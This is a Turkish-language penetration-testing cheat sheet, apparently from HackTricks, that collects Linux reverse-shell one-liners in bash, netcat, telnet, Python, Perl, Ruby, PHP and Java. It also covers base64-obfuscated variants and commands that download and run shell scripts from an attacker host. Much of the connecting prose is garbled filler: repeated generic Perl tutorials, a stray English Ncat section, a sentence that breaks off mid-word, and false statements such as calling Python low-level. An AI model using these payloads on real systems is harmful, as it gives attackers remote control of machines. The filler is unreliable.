# Kabuklar - Linux

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzdaki özel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En önemli güvenlik açıklarını bulun, böylece daha hızlı düzeltebilirsiniz. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

**Bu kabuklar hakkında herhangi bir sorunuz varsa** [**https://explainshell.com/**](https://explainshell.com) **adresinden kontrol edebilirsiniz.**

## Tam TTY

**Ters kabuk elde ettiğinizde** [**tam bir TTY elde etmek için bu sayfayı okuyun**](full-ttys.md)**.**

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
### Güvenli sembol kabuğu

Bash dışında, diğer kabukları da kontrol etmeyi unutmayın: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh ve bash.
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### Shell açıklaması

1. **`bash -i`**: Bu komutun bu kısmı etkileşimli (`-i`) bir Bash kabuğu başlatır.
2. **`>&`**: Bu komutun bu kısmı, **standart çıktıyı** (`stdout`) ve **standart hata** (`stderr`) **aynı hedefe yönlendirmek** için kısa bir gösterimdir.
3. **`/dev/tcp/<SALDIRGAN-IP>/<PORT>`**: Bu, belirtilen IP adresi ve porta **bir TCP bağlantısını temsil eden özel bir dosyadır**.
* Komutun çıktı ve hata akışlarını bu dosyaya yönlendirerek, komut etkili bir şekilde etkileşimli kabuk oturumunun çıktısını saldırganın makinesine gönderir.
4. **`0>&1`**: Bu komutun bu kısmı, **standart girişi (`stdin`) standart çıktı (`stdout`) ile aynı hedefe yönlendirir**.

### Dosyada oluştur ve çalıştır
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## İleriye Dönük Kabuk

Linux tabanlı bir web uygulamasında bir **RCE açığı** ile karşılaşırsanız, Iptables kuralları veya diğer filtrelerin varlığı nedeniyle **ters kabuk elde etmek zorlaşabilir**. Bu tür senaryolarda, borular kullanarak kompromize edilmiş sistem içinde bir PTY kabuğu oluşturmayı düşünebilirsiniz.

Kodu [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell) adresinde bulabilirsiniz.

Sadece aşağıdakileri değiştirmeniz gerekmektedir:

* Zafiyetli ana bilgisayarın URL'si
* Yükünüzün ön eki ve soneki (varsa)
* Yükün nasıl gönderildiği (başlıklar mı? veri mi? ek bilgi mi?)

Ardından, sadece **komutlar gönderebilir** veya hatta **tam bir PTY elde etmek için `upgrade` komutunu kullanabilirsiniz** (boruların okunması ve yazılması yaklaşık 1.3 saniye gecikmeyle gerçekleşir). 

## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## gsocket

[https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/) adresinde kontrol edin.
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
Telnet, bir ağ protokolüdür ve bir bilgisayarın uzaktan başka bir bilgisayara bağlanmasını sağlar. Telnet, bir komut satırı arabirimi kullanarak uzak bir sunucuya erişim sağlar. Bu protokol, birçok işletim sistemi tarafından desteklenir ve genellikle ağ cihazlarına yönetici erişimi sağlamak için kullanılır.

Telnet, TCP/IP protokol yığını üzerinde çalışır ve varsayılan olarak 23 numaralı portu kullanır. Bir telnet istemcisi, bir sunucuya bağlanmak için IP adresi veya alan adı ve port numarası gibi gerekli bilgileri sağlar. Bağlantı kurulduktan sonra, kullanıcı komutları sunucuya gönderebilir ve sunucudan yanıtlar alabilir.

Telnet, verileri şifrelemediği için güvenlik açığına sahiptir. Bu nedenle, güvenli bir bağlantı sağlamak için SSH (Secure Shell) gibi daha güvenli alternatifler tercih edilmelidir. Ancak, bazı durumlarda, özellikle ağ cihazlarına erişim sağlamak için hala kullanılabilir.
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## Whois

**Saldırgan**
```bash
while true; do nc -l <port>; done
```
Komutu göndermek için yazın, enter tuşuna basın ve CTRL+D'ye basın (STDIN'i durdurmak için)

**Hedef**
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## Python

Python, düşük seviyeli bir dildir ve birçok hedefte kullanılabilir. Bir hedefe erişim sağlandığında, Python kullanarak hedef sistemdeki işlemleri otomatikleştirebilir ve kontrol edebilirsiniz.

### Python Geri Bağlantı Kabuğu (Reverse Shell)

Python geri bağlantı kabuğu, hedef sistemde bir kabuk oluşturmanıza olanak tanır ve bu kabuk üzerinden hedef sistemde komutlar çalıştırabilirsiniz. Geri bağlantı kabuğu, hedef sistemde bir Python betiği çalıştırarak veya bir Python betiği yükleyerek oluşturulabilir.

#### Geri Bağlantı Kabuğu Oluşturma

Python geri bağlantı kabuğu oluşturmak için aşağıdaki adımları izleyebilirsiniz:

1. Hedef sistemde bir Python betiği oluşturun veya bir Python betiği yükleyin.
2. Python betiğinde, hedef sistemde bir soket oluşturun ve belirli bir port üzerinden bağlantıları dinleyin.
3. Bağlantı geldiğinde, kabuk oluşturmak için bir alt süreç başlatın ve gelen verileri bu kabuğa yönlendirin.
4. Kabuk üzerinden komutlar çalıştırabilir ve sonuçları geri alabilirsiniz.

Örnek bir Python geri bağlantı kabuğu betiği aşağıdaki gibi olabilir:

```python
import socket
import subprocess

def create_shell():
    # Hedef sistemde bir soket oluşturun ve belirli bir port üzerinden bağlantıları dinleyin
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.bind(('localhost', 1234))
    listener.listen(1)
    
    print('Bağlantı bekleniyor...')
    
    # Bağlantı geldiğinde, kabuk oluşturmak için bir alt süreç başlatın ve gelen verileri bu kabuğa yönlendirin
    connection, address = listener.accept()
    print('Bağlantı alındı:', address)
    
    while True:
        command = connection.recv(1024).decode()
        if command.lower() == 'exit':
            break
        
        # Komutu kabukta çalıştırın ve sonucu geri alın
        output = subprocess.getoutput(command)
        connection.send(output.encode())
    
    connection.close()

create_shell()
```

#### Geri Bağlantı Kabuğuna Bağlanma

Python geri bağlantı kabuğuna bağlanmak için aşağıdaki adımları izleyebilirsiniz:

1. Kendi sistemizde bir Python betiği oluşturun veya indirin.
2. Python betiğinde, hedef sistemdeki IP adresini ve port numarasını belirtin.
3. Python betiğini çalıştırın ve hedef sistemdeki kabuğa bağlanın.
4. Bağlandıktan sonra, kabuk üzerinden komutlar gönderebilir ve sonuçları alabilirsiniz.

Örnek bir Python geri bağlantı kabuğu bağlantı betiği aşağıdaki gibi olabilir:

```python
import socket

def connect_shell():
    # Hedef sistemdeki IP adresini ve port numarasını belirtin
    target_ip = '192.168.1.100'
    target_port = 1234
    
    # Hedef sistemdeki kabuğa bağlanın
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection.connect((target_ip, target_port))
    
    while True:
        command = input('Komut girin: ')
        connection.send(command.encode())
        
        if command.lower() == 'exit':
            break
        
        # Komutun sonucunu alın ve ekrana yazdırın
        output = connection.recv(1024).decode()
        print(output)
    
    connection.close()

connect_shell()
```

Bu şekilde, Python kullanarak geri bağlantı kabuğu oluşturabilir ve hedef sistemde komutlar çalıştırabilirsiniz.
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
## Perl

Perl, Practical Extraction and Reporting Language (Pratik Çıkarma ve Raporlama Dili) olarak da bilinir, genel amaçlı bir betikleme dilidir. Perl, Linux sistemlerinde sıklıkla kullanılan bir programlama dilidir ve birçok farklı amaç için kullanılabilir.

### Perl'i Çalıştırmak

Perl betiklerini çalıştırmak için aşağıdaki komutu kullanabilirsiniz:

```bash
perl script.pl
```

Burada `script.pl`, çalıştırmak istediğiniz Perl betiğinin adıdır.

### Perl Betiklerinde Kullanılan Temel Yapılar

Perl betiklerinde kullanılan temel yapılar şunlardır:

- Değişkenler: Perl'de değişkenler `$` işaretiyle başlar. Örneğin, `$name` bir değişkeni temsil eder.
- Koşullar: Perl'de koşullar `if`, `else` ve `elsif` ifadeleriyle kontrol edilir.
- Döngüler: Perl'de döngüler `for`, `while` ve `foreach` ifadeleriyle gerçekleştirilir.
- Fonksiyonlar: Perl'de fonksiyonlar `sub` ifadesiyle tanımlanır ve çağrılır.

### Perl ile Dosya İşlemleri

Perl, dosya işlemleri için birçok farklı fonksiyon sağlar. İşte bazı örnekler:

- Dosya okuma: `open`, `read` ve `close` fonksiyonları kullanılarak bir dosya okunabilir.
- Dosya yazma: `open`, `write` ve `close` fonksiyonları kullanılarak bir dosyaya yazılabilir.
- Dosya ekleme: `open`, `append` ve `close` fonksiyonları kullanılarak bir dosyaya veri eklenebilir.

### Perl ile Sistem Komutları Çalıştırma

Perl, sistem komutlarını çalıştırmak için `system` fonksiyonunu kullanır. Örneğin, aşağıdaki kod parçası, `ls` komutunu çalıştırır ve çıktısını ekrana yazdırır:

```perl
system("ls");
```

### Perl ile Veritabanı İşlemleri

Perl, veritabanı işlemleri için de kullanılabilir. Perl ile veritabanına bağlanmak ve sorguları çalıştırmak için `DBI` modülü kullanılır. İşte bir örnek:

```perl
use DBI;

my $dbh = DBI->connect("DBI:mysql:database=test;host=localhost", "username", "password");

my $sth = $dbh->prepare("SELECT * FROM users");
$sth->execute();

while (my $row = $sth->fetchrow_hashref) {
    print "Name: $row->{name}, Age: $row->{age}\n";
}

$dbh->disconnect();
```

Bu örnekte, `DBI` modülü kullanılarak bir MySQL veritabanına bağlanılır, bir sorgu çalıştırılır ve sonuçlar ekrana yazdırılır.

### Perl ile Web Scraping

Perl, web scraping için de kullanılabilir. Web scraping, bir web sitesinden veri çekme işlemidir. Perl ile web scraping yapmak için `LWP::Simple` ve `HTML::TreeBuilder` modüllerini kullanabilirsiniz. İşte bir örnek:

```perl
use LWP::Simple;
use HTML::TreeBuilder;

my $url = "https://example.com";
my $content = get($url);

my $tree = HTML::TreeBuilder->new;
$tree->parse($content);

my @links = $tree->look_down(_tag => 'a');
foreach my $link (@links) {
    print $link->attr('href') . "\n";
}

$tree->delete();
```

Bu örnekte, `LWP::Simple` modülü kullanılarak bir web sitesinden içerik alınır, `HTML::TreeBuilder` modülü kullanılarak içerik ağaca dönüştürülür ve ağaç üzerinde gezinerek bağlantıları ekrana yazdırılır.

### Perl ile Regex Kullanımı

Perl, regex (düzenli ifadeler) kullanımı için oldukça güçlü bir dil olarak bilinir. Perl ile regex kullanmak için `=~` operatörünü kullanabilirsiniz. İşte bir örnek:

```perl
my $string = "Hello, World!";
if ($string =~ /Hello/) {
    print "Match found!\n";
} else {
    print "No match found!\n";
}
```

Bu örnekte, `$string` değişkeni üzerinde `Hello` ifadesini arar ve eşleşme bulunursa "Match found!" yazdırır.

### Perl ile Socket Programlama

Perl, socket programlama için de kullanılabilir. Socket programlama, ağ üzerinde veri iletişimi sağlamak için kullanılan bir tekniktir. Perl ile socket programlama yapmak için `Socket` modülünü kullanabilirsiniz. İşte bir örnek:

```perl
use Socket;

my $host = "example.com";
my $port = 80;

socket(my $socket, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
my $ip = inet_aton($host);
my $address = sockaddr_in($port, $ip);

connect($socket, $address);

print $socket "GET / HTTP/1.1\r\nHost: $host\r\n\r\n";

while (my $line = <$socket>) {
    print $line;
}

close($socket);
```

Bu örnekte, `Socket` modülü kullanılarak bir TCP soketi oluşturulur, belirtilen IP adresine ve port numarasına bağlanılır, bir HTTP GET isteği gönderilir ve yanıtı ekrana yazdırılır.

### Perl ile Sistem Günlüklerini İzleme

Perl, sistem günlüklerini izlemek için kullanılabilir. Sistem günlükleri, bir sistemde gerçekleşen olayların kaydedildiği dosyalardır. Perl ile sistem günlüklerini izlemek için `File::Tail` modülünü kullanabilirsiniz. İşte bir örnek:

```perl
use File::Tail;

my $file = "/var/log/syslog";
my $tail = File::Tail->new(name => $file, maxinterval => 1, adjustafter => 1);

while (defined(my $line = $tail->read)) {
    print $line;
}
```

Bu örnekte, `File::Tail` modülü kullanılarak `/var/log/syslog` dosyası izlenir ve her yeni satır ekrana yazdırılır.

### Perl ile Hata Ayıklama

Perl, hata ayıklama için birçok farklı araç sağlar. İşte bazı örnekler:

- `use strict;` ve `use warnings;` ifadeleri, Perl betiğindeki hataları tespit etmek için kullanılır.
- `print` fonksiyonu, betikteki değişken değerlerini kontrol etmek için kullanılabilir.
- `Data::Dumper` modülü, betikteki veri yapılarını incelemek için kullanılabilir.

### Perl ile Sistem Bilgilerini Alma

Perl, sistem bilgilerini alma işlemleri için birçok farklı fonksiyon sağlar. İşte bazı örnekler:

- `uname` fonksiyonu, sistemdeki işletim sistemi bilgilerini döndürür.
- `getpwuid` fonksiyonu, kullanıcı kimliği (UID) kullanarak kullanıcı bilgilerini döndürür.
- `getgrgid` fonksiyonu, grup kimliği (GID) kullanarak grup bilgilerini döndürür.

### Perl ile Sistem Kaynaklarını Kontrol Etme

Perl, sistem kaynaklarını kontrol etmek için birçok farklı fonksiyon sağlar. İşte bazı örnekler:

- `getloadavg` fonksiyonu, sistem yükünü döndürür.
- `getrusage` fonksiyonu, sistem kaynak kullanımını döndürür.
- `times` fonksiyonu, işlem süresini döndürür.

### Perl ile Şifreleme ve Şifre Çözme

Perl, şifreleme ve şifre çözme işlemleri için birçok farklı modül sağlar. İşte bazı örnekler:

- `Crypt::CBC` modülü, CBC (Cipher Block Chaining) şifreleme modunu sağlar.
- `Digest::MD5` modülü, MD5 (Message Digest Algorithm 5) şifreleme algoritmasını sağlar.
- `Crypt::OpenSSL::AES` modülü, AES (Advanced Encryption Standard) şifreleme algoritmasını sağlar.

### Perl ile Ağ İletişimi

Perl, ağ iletişimi için birçok farklı modül sağlar. İşte bazı örnekler:

- `IO::Socket::INET` modülü, TCP/IP üzerinden ağ iletişimi sağlar.
- `Net::Ping` modülü, ICMP (Internet Control Message Protocol) üzerinden ağ ping işlemleri yapar.
- `Net::SMTP` modülü, SMTP (Simple Mail Transfer Protocol) üzerinden e-posta gönderme işlemleri yapar.

### Perl ile XML İşleme

Perl, XML işleme için birçok farklı modül sağlar. İşte bazı örnekler:

- `XML::Simple` modülü, XML dosyalarını okumak ve yazmak için kullanılır.
- `XML::LibXML` modülü, XML dosyalarını ayrıştırmak ve düzenlemek için kullanılır.
- `XML::XPath` modülü, XML dosyalarında XPath ifadeleri kullanarak veri aramak için kullanılır.

### Perl ile JSON İşleme

Perl, JSON işleme için birçok farklı modül sağlar. İşte bazı örnekler:

- `JSON` modülü, JSON verilerini dönüştürmek için kullanılır.
- `JSON::XS` modülü, JSON verilerini hızlı bir şekilde dönüştürmek için kullanılır.
- `JSON::Parse` modülü, JSON verilerini ayrıştırmak için kullanılır.

### Perl ile E-posta İşleme

Perl, e-posta işleme için birçok farklı modül sağlar. İşte bazı örnekler:

- `Email::Sender` modülü, e-posta gönderme işlemleri yapar.
- `Email::MIME` modülü, e-posta mesajlarını oluşturmak ve ayrıştırmak için kullanılır.
- `Email::Simple` modülü, e-posta mesajlarını oluşturmak ve ayrıştırmak için kullanılır.

### Perl ile Web Sunucusu Oluşturma

Perl, web sunucusu oluşturma için kullanılabilir. Perl ile web sunucusu oluşturmak için `HTTP::Server::Simple` modülünü kullanabilirsiniz. İşte bir örnek:

```perl
use HTTP::Server::Simple;

my $server = HTTP::Server::Simple->new();
$server->run();
```

Bu örnekte, `HTTP::Server::Simple` modülü kullanılarak bir web sunucusu oluşturulur ve çalıştırılır.

### Perl ile GUI Uygulamaları Geliştirme

Perl, GUI (Graphical User Interface) uygulamaları geliştirmek için birçok farklı modül sağlar. İşte bazı örnekler:

- `Tk` modülü, Perl/Tk arayüz kitaplığını sağlar.
- `Wx` modülü, WxWidgets arayüz kitaplığını sağlar.
- `Gtk2` modülü, GTK+ arayüz kitaplığını sağlar.

### Perl ile Web Servisleri Geliştirme

Perl, web servisleri geliştirmek için birçok farklı modül sağlar. İşte bazı örnekler:

- `SOAP::Lite` modülü, SOAP (Simple Object Access Protocol) tabanlı web servisleri geliştirmek için kullanılır.
- `XML::Compile::SOAP` modülü, SOAP tabanlı web servisleri geliştirmek için kullanılır.
- `REST::Client` modülü, RESTful web servisleri geliştirmek için kullanılır.

### Perl ile Veri Analizi ve İstatistik

Perl, veri analizi ve istatistik işlemleri için birçok farklı modül sağlar. İşte bazı örnekler:

- `Statistics::Descriptive` modülü, istatistiksel hesaplamalar yapmak için kullanılır.
- `Data::Dumper` modülü, veri yapılarını incelemek için kullanılır.
- `Text::CSV` modülü, CSV (Comma-Separated Values) dosyalarını okumak ve yazmak için kullanılır.

### Perl ile Veri Tabanı Bağlantısı

Perl, veri tabanlarına bağlanmak için birçok farklı modül sağlar. İşte bazı örnekler:

- `DBI` modülü, veri tabanlarına bağlanmak ve sorguları çalıştırmak için kullanılır.
- `DBD::mysql` modülü, MySQL veri tabanına bağlanmak için kullanılır.
- `DBD::Pg` modülü, PostgreSQL veri tabanına bağlanmak için kullanılır.

### Perl ile Dosya İşlemleri

Perl, dosya işlemleri için birçok farklı fonksiyon sağlar. İşte bazı örnekler:

- Dosya okuma: `open`, `read` ve `close` fonksiyonları kullanılarak bir dosya okunabilir.
- Dosya yazma: `open`, `write` ve `close` fonksiyonları kullanılarak bir dosyaya yazılabilir.
- Dosya ekleme: `open`, `append` ve `close` fonksiyonları kullanılarak bir dosyaya veri eklenebilir.

### Perl ile Sistem Komutları Çalıştırma

Perl, sistem komutlarını çalıştırmak için `system` fonksiyonunu kullanır. Örneğin, aşağıdaki kod parçası, `ls` komutunu çalıştırır ve çıktısını ekrana yazdırır:

```perl
system("ls");
```

### Perl ile Veritabanı İşlemleri

Perl, veritabanı işlemleri için de kullanılabilir. Perl ile veritabanına bağlanmak ve sorguları çalıştırmak için `DBI` modülü kullanılır. İşte bir örnek:

```perl
use DBI;

my $dbh = DBI->connect("DBI:mysql:database=test;host=localhost", "username", "password");

my $sth = $dbh->prepare("SELECT * FROM users");
$sth->execute();

while (my $row = $sth->fetchrow_hashref) {
    print "Name: $row->{name}, Age: $row->{age}\n";
}

$dbh->disconnect();
```

Bu örnekte, `DBI` modülü kullanılarak bir MySQL veritabanına bağlanılır, bir sorgu çalıştırılır ve sonuçlar ekrana yazdırılır.

### Perl ile Web Scraping

Perl, web scraping için de kullanılabilir. Web scraping, bir web sitesinden veri çekme işlemidir. Perl ile web scraping yapmak için `LWP::Simple` ve `HTML::TreeBuilder` modüllerini kullanabilirsiniz. İşte bir örnek:

```perl
use LWP::Simple;
use HTML::TreeBuilder;

my $url = "https://example.com";
my $content = get($url);

my $tree = HTML::TreeBuilder->new;
$tree->parse($content);

my @links = $tree->look_down(_tag => 'a');
foreach my $link (@links) {
    print $link->attr('href') . "\n";
}

$tree->delete();
```

Bu örne
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby, birçok programlama diline benzer bir şekilde, Linux kabuğunda da kullanılabilir. Ruby, Linux sistemlerindeki birçok görevi otomatikleştirmek için kullanılan bir betikleme dilidir. Ruby betikleri, Linux kabuğunda çalıştırılabilecek komut dosyalarıdır.

Ruby betiklerini Linux kabuğunda çalıştırmak için aşağıdaki adımları izleyebilirsiniz:

1. Ruby yüklü olmalıdır. Eğer yüklü değilse, `sudo apt-get install ruby` komutunu kullanarak Ruby'yi yükleyebilirsiniz.

2. Ruby betiğini oluşturun veya mevcut bir Ruby betiğini düzenleyin. Betiğinizi `.rb` uzantısıyla kaydedin.

3. Betiği çalıştırmak için aşağıdaki komutu kullanın:

   ```bash
   ruby betik_adi.rb
   ```

   Burada `betik_adi.rb`, çalıştırmak istediğiniz Ruby betiğinin adıdır.

Ruby betikleri, Linux kabuğunda birçok farklı görevi gerçekleştirmek için kullanılabilir. Örneğin, dosya işlemleri yapabilir, sistem komutlarını çalıştırabilir, ağ bağlantıları oluşturabilir ve veritabanlarına erişebilirsiniz.

Ruby'nin Linux kabuğunda kullanılması, otomasyon ve hızlı görev gerçekleştirme açısından büyük avantajlar sağlar. Bu nedenle, Ruby betiklerini kullanarak Linux sistemlerindeki işlerinizi kolaylaştırabilirsiniz.
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP

PHP, Hypertext Preprocessor olarak da bilinen, web geliştirme için yaygın olarak kullanılan bir programlama dilidir. PHP, sunucu taraflı bir dil olduğu için, sunucuda çalıştırılır ve sonuçlar web tarayıcısına gönderilir. PHP, dinamik web sayfaları oluşturmak için kullanılır ve HTML ile kolayca birleştirilebilir.

PHP, birçok farklı işlevi destekler ve veritabanı bağlantıları, dosya işlemleri, form işleme ve daha fazlası gibi yaygın web geliştirme görevlerini kolaylaştırır. Ayrıca, PHP'nin geniş bir kullanıcı tabanı vardır ve çevrimiçi olarak birçok kaynak ve topluluk bulunmaktadır.

PHP, güvenlik açıklarına karşı hassas olabilir, bu nedenle güvenli kodlama uygulamalarını bilmek önemlidir. Örneğin, kullanıcı girişi gibi verileri doğrulamak ve güvenli bir şekilde işlemek önemlidir. Ayrıca, güncellemeleri takip etmek ve güvenlik yamalarını uygulamak da önemlidir.

PHP, birçok popüler CMS (İçerik Yönetim Sistemi) ve e-ticaret platformu tarafından desteklenir. Bu nedenle, PHP'yi öğrenmek ve web geliştirme projelerinde kullanmak, geniş bir kullanım alanı sunar.
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## Java

Java, bir nesne yönelimli programlama dilidir. 1995 yılında Sun Microsystems tarafından geliştirilmiştir. Java, platform bağımsız bir dil olarak bilinir, yani Java kodu, farklı işletim sistemlerinde çalışabilir. Java, güçlü bir yazılım geliştirme aracı olan Java Development Kit (JDK) ile birlikte gelir.

Java, birçok farklı uygulama alanında kullanılabilir. Özellikle büyük ölçekli kurumsal uygulamalar, mobil uygulamalar, oyunlar ve web uygulamaları için tercih edilir. Java, güvenlik, performans ve taşınabilirlik açısından da avantajlara sahiptir.

Java, nesne yönelimli programlama prensiplerine dayanır. Nesneler, sınıflar tarafından tanımlanan özellikler ve davranışlarla temsil edilir. Java, zengin bir standart kütüphane sunar ve bu kütüphane, geliştiricilere birçok hazır bileşen ve işlev sağlar.

Java, platform bağımsızlığını JVM (Java Virtual Machine) sayesinde elde eder. JVM, Java kodunu farklı işletim sistemlerinde çalıştırmak için kullanılır. Java kodu, önce JVM tarafından derlenir ve ardından JVM tarafından çalıştırılır.

Java, güvenlik açısından da önemli bir dildir. Java, otomatik bellek yönetimi ve güvenlik kontrolleri gibi özelliklerle donatılmıştır. Bu özellikler, hafıza sızıntıları ve güvenlik açıklarının önlenmesine yardımcı olur.

Java, geniş bir topluluğa sahiptir ve bu topluluk, geliştiricilere destek ve kaynak sağlar. Java, sürekli olarak güncellenir ve geliştirilir, bu da yeni özelliklerin ve iyileştirmelerin düzenli olarak sunulmasını sağlar.

Java, öğrenmesi kolay bir dil değildir, ancak güçlü bir dil olduğu için öğrenmeye değerdir. Java, karmaşık uygulamaları kolayca geliştirmek için kullanılan birçok araç ve çerçeve sunar.

Java, geniş bir iş imkanı yelpazesine sahiptir. Java bilen birçok şirket, Java geliştiricilerine ihtiyaç duyar. Java, yüksek performanslı, güvenli ve taşınabilir uygulamalar geliştirmek için tercih edilen bir dil olarak popülerliğini korumaktadır.
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat

Ncat, a.k.a. Netcat, is a powerful networking utility that allows for reading from and writing to network connections using TCP or UDP protocols. It can be used for various purposes, including port scanning, file transfer, and remote administration.

### Installation

Ncat is usually pre-installed on Linux distributions. If it is not available, you can install it using the package manager of your distribution. For example, on Debian-based systems, you can use the following command:

```bash
sudo apt-get install ncat
```

### Basic Usage

To establish a TCP connection to a remote host, you can use the following command:

```bash
ncat <host> <port>
```

For example, to connect to a web server running on `example.com` on port `80`, you can use:

```bash
ncat example.com 80
```

Once the connection is established, you can interact with the remote host by typing commands or sending data.

### Port Scanning

Ncat can also be used for port scanning. To scan a range of ports on a remote host, you can use the following command:

```bash
ncat -v -z <host> <start-port>-<end-port>
```

For example, to scan ports `1` to `100` on `example.com`, you can use:

```bash
ncat -v -z example.com 1-100
```

### File Transfer

Ncat can be used to transfer files between two hosts. To send a file from the local host to a remote host, you can use the following command on the remote host:

```bash
ncat -l <port> > <file>
```

On the local host, you can use the following command to send the file:

```bash
ncat <host> <port> < <file>
```

### Remote Administration

Ncat can also be used for remote administration tasks. For example, you can use it to execute commands on a remote host by piping the output of a command on the local host to a command on the remote host. Here's an example:

```bash
echo "ls -l" | ncat <host> <port> | bash
```

This will execute the `ls -l` command on the remote host and display the output on the local host.

### Conclusion

